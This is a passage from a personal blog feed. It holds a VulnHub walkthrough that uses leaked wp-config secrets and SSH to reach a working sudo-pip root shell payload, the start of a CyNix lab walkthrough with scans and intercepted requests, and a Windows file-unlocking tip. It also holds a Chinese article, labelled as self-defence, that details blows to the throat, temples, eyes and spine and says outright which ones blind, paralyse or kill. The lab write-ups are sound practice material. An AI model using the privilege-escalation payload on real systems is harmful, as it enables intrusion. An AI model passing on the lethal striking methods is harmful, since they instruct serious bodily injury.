PS7=~~/;uA5)zj~Z%tu&#125;-8UJ&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&amp;GL,i@+4m:1w3|-aW&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;m5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R&lt;K&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;sl3w_.&#125;n|M&#123;~D#6,v]U?Kz/,k&amp;oCnn1._|(i3Y|ng7+&lt;-f4Nv7mmR4B&lt;i&gt;!?du#i&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;b&gt;,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0&lt;|E@6^.8~KpI_#53Rw_&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;v_`E=EA]$UBa.2P|%YV4cl&#125;(c@AVkW$V5959/gQL~a:,O&#125;qfG85Xc4)=xRBux6g?&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;TE#Tim,4h|zKYm$he[F%J*4vG&#123;v]VK!jP0sSeBLHp7Mp|P*XJz:=&amp;n&lt;nsfbIFq&gt;a&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//`Db]f&#123;He3HgO`(z</span></span><br></pre></td></tr></table></figure>

<p>将其中的ra/912391929129连接ssh发现连接不上，再将ra/<code>Db]f&#123;He3HgO</code>(z连接ssh，成功登录，真想说一句what the fuck!!!!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ra@192.168.1.15</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.15 (192.168.1.15)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:YRICww0bKH3fcEIycw4x9iWEv3gF1qtqElE7ecocCn8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.15<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ra@192.168.1.15&#x27;</span>s password: </span><br><span class="line">Linux wtf 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Nov 21 12:47:56 2019 from 192.168.1.13</span><br><span class="line">ra@wtf:~$ ls</span><br><span class="line">ra@wtf:~$ id</span><br><span class="line">uid=1000(ra) gid=1000(ra) groups=1000(ra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">ra@wtf:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/ra</span><br><span class="line">ra@wtf:~$ whoami</span><br><span class="line">ra</span><br><span class="line">ra@wtf:~$ ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 ra   ra   4096 Nov 21 15:04 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 21 06:45 ..</span><br><span class="line">-rw------- 1 ra   ra    480 Nov 21 15:01 .bash_history</span><br><span class="line">-rw-r--r-- 1 ra   ra    220 Nov 21 06:45 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ra   ra   3526 Nov 21 06:45 .bashrc</span><br><span class="line">drwx------ 3 ra   ra   4096 Nov 21 14:18 .gnupg</span><br><span class="line">-rw-r--r-- 1 ra   ra    807 Nov 21 06:45 .profile</span><br><span class="line">ra@wtf:~$</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ra@wtf:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> ra on wtf:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ra may run the following commands on wtf:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure>

<p>发现/usr/bin/pip可以以root用户的权限执行，网上搜索利用方法，传送门<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">GTFOBins<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub93.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ra@wtf:~$ TF=$(mktemp -d)</span><br><span class="line">ra@wtf:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">ra@wtf:~$ sudo pip install <span class="variable">$TF</span></span><br><span class="line">Processing /tmp/tmp.FbYhS1oIjc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>运行poc后成功提权,然后找到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">WTF rooted!</span><br><span class="line">haha, well <span class="keyword">done</span>. </span><br><span class="line">You can find me on discord to tell me your opinion about <span class="string">&quot;WTF&quot;</span> -&gt; pwn4magic<span class="comment">#8707</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>帅的掉渣</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub94.jpg"></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[blunder]</title>
    <url>/2020/06/05/blunder/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the users.php pass hash</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="990dbe670cf1e4b1a5bccebf7ffac034a86397a52eae9b9d5e7e23427b11e2ad"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>(肉搏)最快使人突然晕厥的方法</title>
    <url>/2019/02/13/fight/</url>
    <content><![CDATA[<h3 id="仅供学习防身参考使用"><a href="#仅供学习防身参考使用" class="headerlink" title="仅供学习防身参考使用"></a>仅供学习防身参考使用</h3><p>1.頭部要害及擊打方法：頭部是要害部位集中的地方，主要有十個要害區。<br>(一)耳：耳廊神經離大腦較近，受到擊打後可損傷腦膜中的動脈。擊打的穴位是面部神經主枝至耳頂端上部。擊打方法：兩手成杯狀；同時拍擊雙耳。在中國傳統武術中叫“雙峰貫耳”。掐拿耳根可會產生劇烈的酸痛感，重可令人昏厥。用掌劈擊耳根可令人立即斃命。<br>擊打後果：輕則擊穿耳膜或耳內出血，重則致腦震盪或死亡。<br>（二）太陽穴：此部位骨質脆弱。在眼角後約5厘米，向上約2.5厘米處，有一根聶頁神經，向內朝顱骨方向擊打，極容易制敵。擊打方法：用掌外側、拳、肘等擊打，用橫削掌砍擊太陽穴.如敵倒地則用足尖。<br>擊打後果：輕則腦震盪，重則死亡。<br>（三）眼睛：擊打方法：用食指，中指猛刺敵雙眼，插眼要由下至上插入，則插即中。中國傳統武術稱“雙龍取珠”。也可挖敵雙眼。<br>擊打後果：造成雙目失明，失去戰鬥力。<br>（四）鼻：擊打方法；用掌外側或拳頭橫擊鼻樑。由上而下擊打鼻骨，一擊即斷碎.<br>擊打後果； 可擊碎鼻樑骨，使敵疼痛難忍。<br>（五）上唇：此處是鼻軟骨與硬骨的連接處，神經接近皮層。<br>擊打方法：用掌的小指一側猛擊或用拳戳擊。<br>擊打後果：輕則劇痛，重則能使人昏迷。<br>（六）下巴：擊打方法；用掌根猛擊敵下巴。因為用拳很可能損傷自己的手指關節，但如果拳頭硬度不錯，用拳頭擊打，往往一招就令敵騰空而倒。勾拳擊頜下，可令人轟然倒下成腦震盪<br>擊打後果：劇痛或脫位。<br>（七）喉結：喉結處有氣管，頸動脈還有迷走神經。<br>擊打方法：用八字拳術或用掌外側硬擊，也可用手指抓捏。<br>擊打後果：輕則疼痛難忍，重則昏迷或死亡。<br>（八）咽喉：擊打方法：用手指猛戳咽喉下部的凹處。<br>擊打後果：可使敵感到劇痛，窒息。<br>（九）頸外側：擊打方法：用掌外側猛砍。<br>擊打後果：昏迷。<br>（十）頸後部：擊打方法：用掌或拳的小指一側劈砸。劈拳擊頸後枕下三角區。<br>擊打後果：可令人立即昏迷至致敵死亡。</p>
<a id="more"></a>

<p>2、軀幹要害部位及擊打方法：軀幹中有鎖骨、腋窩、腹、襠、脊椎及心、肺、脾、胃、腎等要害部位。<br>（一）鎖骨：肩部有“肩井穴”，用掌外側砍劈後，傷及“雲門”“中府”兩穴，直接擊打鎖骨，也可收到良好的效果。<br>擊打方法：用掌外側向下猛砍。<br>擊打後果；可打斷鎖骨，使其癱倒。<br>（二）腋窩：格鬥時，很少有人想到擊打這個部位。其實腋窩下有一條粗大的神經，很不經打。<br>擊打方法：敵倒地後，用腳尖猛踢。<br>擊打後果：劇痛或短暫的局部癱瘓。<br>（三）心窩；擊打方法：用尖拳猛戳，不宜用手掌或拳頭。<br>擊打後果；劇痛難忍，昏迷。<br>（四）腹部：腹部包括腹腔劍突以下肚臍以上的部位，肝、脾、腎、胃重要器官密布其中。<br>擊打方法；拳打，膝頂，肘擊，腳踢。穿透力最理想是拳指關節猛擊。<br>擊打後果；致傷，死亡。<br>（五）襠部：人體神經末梢最豐富，敏感的地方。<br>擊打方法；膝頂，腳踢，手抓。<br>擊打後果：劇痛，甚至死亡。<br>（六）腎部：擊打方法：用掌外側砍，拳打，腳踢等。<br>擊打後果；腎部致傷。可令人休克。<br>（七）肋部：最理想是擊打右肋部，因肝臟位於右肋下部，此處骨頭也最細脆，容易折斷。折斷的肋骨很容易刺破內臟。<br>擊打方法：掌砍，腳尖踢，膝頂等。<br>擊打後果：肝臟嚴重損傷，重則死亡。<br>（八）脊椎：它是人體支柱，受到擊打，極易脫位。<br>擊打方法：敵倒地後，用膝，肘，腳頂，撞，踩，部位是皮帶上方9厘米處。擊打後果：癱瘓，死亡。</p>
<p>3、四肢要害及擊打方法；四肢骨共有100多塊。施以正確的擊打方法導致脫臼、骨折或韌帶撕裂。在施用擒拿術時，對四肢關節是不能不高度重視的。<br>（一）指關節：都是單軸關節，活動範圍較小，只能伸屈，伸直時，往後或往兩側猛折會造成脫臼或骨折。<br>擊打方法；用手猛折。<br>擊打後果：骨折，脫臼。<br>（二）腕關節：腕關節有8塊腕骨，骨小易碎。<br>擊打方法：施用擒拿術時，用掌外側扣壓。<br>擊打後果：脫臼、骨折、劇痛難熬。<br>（三）肘關節：它由橈骨，尺骨和肱骨連接而成，完全伸直後，最怕從後施加壓力或擊打。<br>擊打方法；用拳或掌擊肘後部，膝蓋猛風吹草動或用小臂壓擊。<br>擊打後果：脫臼，韌帶撕裂。<br>（四）肩關節：肩關節由肩胛骨，肱骨和鎖骨連接而成，最怕左右猛擰和往後上板​​至極點。<br>擊打方法：敵倒地後，用膝頂壓或用腳猛踩。<br>擊打後果：脫臼、韌帶和肌肉撕裂。<br>（五）膝關節；膝關節由兩個關節複合而成，有臏骨，腓骨，脛骨，半月板和股骨。<br>擊打方法：伸直時，從前方，側方用腳猛力蹬踹。膝關節伸直時正面衝擊容易損傷，彎曲時側面易損傷。<br>擊打後果；脫臼或骨折，半月板破裂。<br>（六）腳背：腳背神經密布，肌肉較少，忌用腳踩。<br>擊打方法；用腳後跟猛踩，或腳尖很戳。<br>擊打後果；骨頭斷裂，劇痛難熬</p>
<p>（1）人體要害部位：咽喉<br>喉部的要害主要為咽喉和喉結。在頸部前面，兩鎖骨內側、胸骨柄上緣有一個凹陷，凹陷內有下行的無名靜脈、氣管、食管以及膈神經和迷走神經分支。氣管位於皮下最表層。這一凹陷部位通常被俗稱為咽喉，在中醫經絡學上，又被稱為“天突穴”。 “天災穴”自古被視為要害部位，少林拳法中還傳有“二捅天突穴，鎖喉致昏啞”的技擊歌訣。</p>
<p>以手指用力直戳天突穴，可以猛烈地壓迫氣管，刺激迷走神經和膈神經，引起反射性的呼吸困難和劇烈咳嗽，甚至引起窒息。肺部的迷走神經直接分佈於氣管及肺內的支氣管樹，支配著肺臟的呼吸，而膈神經則直接分佈於人體最主要的呼吸肌——膈肌的中央，支配著膈肌的運動。膈神經遭強烈刺激必然造成膈肌痙攣，引起劇烈咳嗽和呼吸困難，迷走神經遇強烈刺檄則會通過延髓的迷走神經中樞使肺的呼吸功能受到反射性的抑制，其結果，很容易導致窒息。以手指持續用力掐拿天突穴，可以使氣管、無名靜脈、迷走神經和膈神經同時受到壓迫，並可因呼吸受阻、靜脈回流受阻、腦缺氧和神經反射作用，引起窒息或昏迷。</p>
<p>打擊或掐拿天突穴，一般不會造成致命的後果，但如果咽喉被刺破，則會造成嚴重的血胸和縱膈氣腫，使大量血液流入胸腔，並使縱膈和頸部皮下發生氣腫。血胸和縱膈氣腫會壓迫肺臟和心臟，都可以在短時間使人死亡。</p>
<p>喉結在頸部正中，突出於皮下，成年男子尤為顯著。喉結上通咽和口、鼻腔，下連氣管，是肺臟與外界進行氣體交換的通氣要道。喉由軟骨構成支架，其中甲狀軟骨為最大的一塊，甲狀軟骨在頸的突出的部份即為喉結。喉結通常被人們視為要害部位。打擊喉結、扼喉、勒頸、以及銳器切頸常常被當作致命的殺傷手段。據法醫臨案統計，很多自殺或殺人者都習慣於在喉結上下切頸。</p>
<p>無論自殺或他殺，切頸者多誤認為切斷氣管或喉管便可以輕易致死。但事實上，切斷氣管僅僅縮短了呼吸道，並不能構成真正的死因。而徒手以拳、掌打擊喉結或勒頸、扼喉、壓迫喉結，卻都能致人於死地。</p>
<p>1、持續壓迫喉結可使呼吸、循環受阻<br>鎖喉、扼喉、勒頸、以掌指持續地壓迫喉結一般並不能使人立即致死，多需要經過一段時間，死亡速度比較緩慢。壓迫喉結致死，主要是由於阻斷了呼吸和阻斷了腦循環血流引起的。以掌指壓迫喉結，一般都不能使呼吸道完全阻塞。呼吸道完全被阻塞的可能性極小，只有以較細的繩索勒壓在甲狀軟骨與舌骨之間時才會發生。由於扼喉時呼吸受阻是不完全的，因而造成的窒息也是不完全的。在這種情況下致死過程就需要持續一段時間。</p>
<p>而以掌指壓迫喉結時，一般也不能完全阻斷頭、頸部的循環血流。向頭部供血的頸動脈因為有胸鎖乳突肌的覆蓋，不易被完全阻斷，深層的椎動脈受頸椎的保護，根本壓迫不到，仍能保持暢通。所以，頸部受壓時動脈供血受阻也是不完全的。只有頸靜脈回流受阻通常比較嚴重。然而頸靜脈回流受阻也不能在喉結受壓後立即形成。因此，由動脈供血不足，靜脈回流受阻引起的頭部淤血、顱內壓升高和腦缺氧也需要持續一定的時間才能真正形成。</p>
<p>無論壓迫了呼吸道使肺通氣受阻，還是壓迫了動、靜脈血管使腦循環血流受阻，都會由於腦血流中二氧化碳濃度不斷升高，氧分壓逐漸下降，引起大腦缺氧而導致死亡。在腦缺氧形成以後，腦組織仍有一定的耐受時間，一般腦缺氧1—3分鐘可使人陷入昏迷， 5—6分鐘才能使人完全死亡。腦缺氧形成以後，還會刺激頸動脈中的“化學感受裝置”，使人產生強烈的深呼吸慾望，繼而會產生窒息的恐懼心理和垂死的反抗和掙扎。在抵抗力量較大的情況下，死亡速度通常比較緩慢，一般都需要幾分鐘時間。</p>
<p>2、打擊喉結可以立即致死<br>以拳、掌打擊喉結可以立即致人於死地。這主要是由於喉結上的喉上神經和食管上的迷走神經叢受到強力刺激，致使心跳、呼吸產生反射性抑制的結果。喉上神經是迷走神經的一個分支，也是頸部皮下一個重要的感覺神經末稍。食管迷走神經叢在緊靠氣管後壁的食管上，由左右迷走神經相互交錯而成。迷走神經聯繫著延髓迷走神經中樞，對心跳、呼吸有強烈的抑製作用。強力打擊喉結，會刺激喉上神經和食管迷走神經叢產生強烈興奮，傳入延髓，引起反射性閉氣、突然窒息、心率銳減、血壓下降，甚至引起呼吸、心跳驟停而立即導致昏迷或死亡。<br>（2）劈拳擊後腦，輕則腦震盪、昏迷、重則斃命。</p>
<p><font color="red"><strong><em>切記 在最危急時才能使用 否則難逃刑責</em></strong></font></p>
]]></content>
      <categories>
        <category>搏击</category>
      </categories>
      <tags>
        <tag>肉搏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下强制删除文件或文件夹(解除文件占用/Unlock，亲测实用)</title>
    <url>/2019/12/03/force-delete/</url>
    <content><![CDATA[<p><font color="green">想必的大多玩电脑的人都有下面的经历，就是有时想删除个什么文件，或者文件夹，电脑忽然弹出文件正在被占用，删除不了的情况，然后网上搜了一堆方法，大多是，新建bat文本里面填上如下的代码：</font></p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DEL /F /A /Q \\?\%1</span><br><span class="line"></span><br><span class="line">RD /S /Q \\?\%1</span><br></pre></td></tr></table></figure>

<p><font color="green">然后将需要删除的文件拖到.bat文件上删除，但是有时候少数文件使用这种方法还是删除不了该怎么办呢？就要用到下面几种神器了，亲测有效.</font></p>
<h3 id="ProcessHacker"><a href="#ProcessHacker" class="headerlink" title="ProcessHacker"></a>ProcessHacker</h3><p>如果删除文件时，提示文件被占用，通过processhacker找到占用文件的进程。</p>
<p>在Processhacker中把占用的进程结束，然后就可以删除文件了。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2Rvd25sb2Fkcy5waHA=">ProcessHacker官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="LockHunter"><a href="#LockHunter" class="headerlink" title="LockHunter"></a>LockHunter</h3><p>推荐此软件：LockHunter - 右键解锁强制删除顽固文件(夹)，并可查看占用锁住文件的软件进程</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5pcGxheXNvZnQuY29tL2xvY2todW50ZXIuaHRtbA==">介绍<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5sb2NraHVudGVyLmNvbS9kb3dubG9hZC5odG0=">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h3><p><span class="exturl" data-url="aHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2hhbmRsZQ==">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="IObit-Unlocker"><a href="#IObit-Unlocker" class="headerlink" title="IObit Unlocker"></a>IObit Unlocker</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBsYXlzb2Z0LmNvbS9pb2JpdC11bmxvY2tlci5odG1s">IObit Unlocker - 免费实用的文件/夹强制解锁删除工具 (解决文件被占用无法删除/移动的问题)<i class="fa fa-external-link-alt"></i></span></p>
<p><strong><em>其它更多工具请自行<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8/Z3dzX3JkPXNzbA==">GOOGLE<i class="fa fa-external-link-alt"></i></span></em></strong></p>
]]></content>
      <categories>
        <category>tips</category>
      </categories>
      <tags>
        <tag>windows tips</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[CyNix-1]</title>
    <url>/2020/05/20/cynix/</url>
    <content><![CDATA[<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><font color="red">为了帮助自己更好的成长，适应国际潮流与发展。从这篇文章开始，本人以后所有的技术文章，walkthrough,writeup,及其他乱七八糟的东西，全部用英文，重要的事情强调3遍,全部用英文!全部用英文!全部用英文!以后为适应国际潮流，文章将不定期换用其它国家的语言！！！</font></p>
<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: CyNix: 1<br>Date release: 18 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MW9WOEo0bzNSOFdQMjVmbklNeTBaS2RaaS05N2VOUDZi">https://drive.google.com/open?id=1oV8J4o3R8WP25fnIMy0ZKdZi-97eNP6b<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmE=">https://download.vulnhub.com/cynix/CyNix.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmEudG9ycmVudA==">https://download.vulnhub.com/cynix/CyNix.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Intermediate-Hard</li>
<li>User flag: user.txt</li>
<li>Root flag: root.txt</li>
<li>Description: It’s a Boot2Root machine. The machine is VirtualBox compatible but can be used in VMWare as well (not tested but it should work). The DHCP will assign an IP automatically. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively. Enjoy pwning it!</li>
</ul>
<p>We recommend that you use VirtualBox and not VMware for this VM</p>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.56.*</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.125</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p>then Get more detailed information</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -T4 -v -p- 192.168.56.125</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">6688/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6d:df:0d:37:b1:3c:86:0e:e6:6f:84:b9:28:11:ee:68 (RSA)</span><br><span class="line">|   256 8f:3e:c0:08:03:13:e8:64:89:f6:f9:63:b3:88:99:2a (ECDSA)</span><br><span class="line">|_  256 fb:e3:40:e6:91:0b:3c:bc:b7:0e:c7:bd:ef:a2:93:<span class="built_in">fc</span> (ED25519)</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>i use dirbuster for Web Directory scanning, get the following results</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/icons    403</span><br><span class="line">/lavalamp    200</span><br><span class="line">/server-status    403</span><br></pre></td></tr></table></figure>

<p>turn to contact page,i use burp got the following request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/</span><br><span class="line"></span><br><span class="line">name=<span class="built_in">test</span>&amp;email=ccasdcasdcas%40qq.com&amp;subject=fuckyou&amp;message=wocaonimacasdcasdcasd</span><br></pre></td></tr></table></figure>

<p>then go to </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.125/lavalamp/canyoubypassme.php</span><br></pre></td></tr></table></figure>

<p>check the source code</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;table width=<span class="string">&quot;40%&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;0&quot;</span> margin=<span class="string">&quot;20%&quot;</span> class=<span class="string">&quot;tb1&quot;</span> style=<span class="string">&quot;margin:2% 30%;opacity: 0.0;&quot;</span>&gt;</span><br><span class="line">   &lt;tr&gt;&lt;td align=center style=<span class="string">&quot;padding: 3%;&quot;</span>&gt;</span><br><span class="line">    &lt;form method=post action=<span class="string">&quot;/lavalamp/canyoubypassme.php&quot;</span>&gt;Specify a number: &lt;input <span class="built_in">type</span>=text name=file placeholder=<span class="built_in">integer</span>&gt;&lt;br&gt;&lt;br&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="built_in">read</span> value=<span class="string">&quot;Download the number&quot;</span>&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>now change the opacity 0:0 to 1:0, and see what will happen</p>
<p>we got a visible form by doing that,then use burp intercept the data</p>
